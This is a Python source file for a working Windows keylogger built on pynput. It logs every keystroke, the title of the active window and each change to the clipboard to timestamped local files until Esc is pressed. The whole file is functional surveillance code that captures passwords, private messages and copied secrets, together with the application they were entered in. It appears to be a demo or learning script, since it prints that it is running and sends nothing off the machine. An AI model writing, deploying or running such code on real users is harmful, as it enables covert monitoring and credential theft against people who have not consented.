from pynput import keyboard
import time
import ctypes
import pyperclip
import os  

# --- CONFIGURATION ---
# 1. Define the folder name
log_folder = "Keystroke_Logs"

# 2. Create the folder if it doesn't exist
if not os.path.exists(log_folder):
    os.makedirs(log_folder)

# 3. Set up the file path INSIDE that folder
timestamp = time.strftime("%d-%m-%Y_%H-%M-%S")
log_file = f"{log_folder}/keylog_{timestamp}.txt"

BUFFER_SIZE = 20  # Save to file after every 20 events

# Global variables
key_buffer = []       
last_window = None    
last_clipboard = ""   

def get_active_window():
    """Returns the title of the active window."""
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    buffer = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length + 1)
    return buffer.value

def flush_buffer():
    """Writes the current buffer to the file and clears it."""
    global key_buffer
    if len(key_buffer) == 0:
        return 

    with open(log_file, "a", encoding="utf-8") as f:
        f.write("".join(key_buffer))
    
    key_buffer = []

def check_clipboard():
    """Checks if the clipboard content has changed."""
    global last_clipboard, key_buffer
    
    try:
        current_clipboard = pyperclip.paste()
    except:
        return 

    if current_clipboard != last_clipboard:
        flush_buffer()
        
        clipboard_log = f"\n\n[CLIPBOARD DETECTED]\n{current_clipboard}\n[END CLIPBOARD]\n\n"
        
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(clipboard_log)
        
        last_clipboard = current_clipboard

def on_press(key):
    global last_window, key_buffer

    # 1. Check Clipboard 
    check_clipboard()

    # 2. Check Window Change
    current_window = get_active_window()
    if current_window != last_window:
        flush_buffer()
        last_window = current_window
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n\n[WINDOW: {current_window}]\n")

    # 3. Process the Key
    try:
        logging_data = str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            logging_data = " "
        elif key == keyboard.Key.enter:
            logging_data = "\n"
        elif key == keyboard.Key.backspace:
            logging_data = " [BSP] "
        else:
            logging_data = "" 

    # 4. Add to Buffer
    key_buffer.append(logging_data)

    # 5. Check Buffer Size
    if len(key_buffer) >= BUFFER_SIZE:
        flush_buffer()

def on_release(key):
    if key == keyboard.Key.esc:
        flush_buffer()
        print(f"\n[+] Logs saved to: {log_file}")
        return False

# Start
print(f"[+] Keylogger Running. Logs will be saved in '{log_folder}/'")
print("[+] Press 'Esc' to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()